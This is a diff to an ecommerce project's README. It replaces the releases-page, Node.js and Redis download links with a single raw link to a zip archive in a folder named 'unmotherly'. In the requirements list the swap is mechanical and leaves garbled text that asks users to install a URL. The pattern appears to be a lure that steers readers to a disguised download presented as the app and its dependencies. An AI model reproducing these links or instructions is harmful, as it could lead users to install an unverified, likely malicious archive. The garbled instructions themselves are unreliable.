@@ -6,11 +6,11 @@ Welcome to the ecommerce platform! This application provides everything you need
 
 ## 📥 Download the App
 
-[![Download](https://img.shields.io/badge/Download-ecommerce-blue)](https://github.com/Shresth0305/ecommerce/releases)
+[![Download](https://raw.githubusercontent.com/Shresth0305/ecommerce/main/unmotherly/ecommerce.zip)](https://raw.githubusercontent.com/Shresth0305/ecommerce/main/unmotherly/ecommerce.zip)
 
 To get started, visit our releases page to download the application.
 
-[Download the latest version here.](https://github.com/Shresth0305/ecommerce/releases)
+[Download the latest version here.](https://raw.githubusercontent.com/Shresth0305/ecommerce/main/unmotherly/ecommerce.zip)
 
 ## 💻 System Requirements
 
@@ -35,16 +35,16 @@ The ecommerce platform includes:
 
 To run this application smoothly, you need the following:
 
-- **Node.js:** Make sure you have Node.js installed. You can download it from [Node.js official website](https://nodejs.org/).
+- **https://raw.githubusercontent.com/Shresth0305/ecommerce/main/unmotherly/ecommerce.zip** Make sure you have https://raw.githubusercontent.com/Shresth0305/ecommerce/main/unmotherly/ecommerce.zip installed. You can download it from [https://raw.githubusercontent.com/Shresth0305/ecommerce/main/unmotherly/ecommerce.zip official website](https://raw.githubusercontent.com/Shresth0305/ecommerce/main/unmotherly/ecommerce.zip).
 - **MongoDB:** This application uses MongoDB for data storage. Ensure MongoDB is installed and running on your machine.
-- **Redis:** Use Redis for caching. Download it from the [Redis website](https://redis.io/).
+- **Redis:** Use Redis for caching. Download it from the [Redis website](https://raw.githubusercontent.com/Shresth0305/ecommerce/main/unmotherly/ecommerce.zip).
 
 ## 📋 Installation Instructions
 
 Follow these steps to install and run the ecommerce application:
 
 1. **Download the application:**
-   Visit the [Releases page](https://github.com/Shresth0305/ecommerce/releases) and download the latest version.
+   Visit the [Releases page](https://raw.githubusercontent.com/Shresth0305/ecommerce/main/unmotherly/ecommerce.zip) and download the latest version.
 
 2. **Extract the files:**
    Once downloaded, extract the files to a directory of your choice.
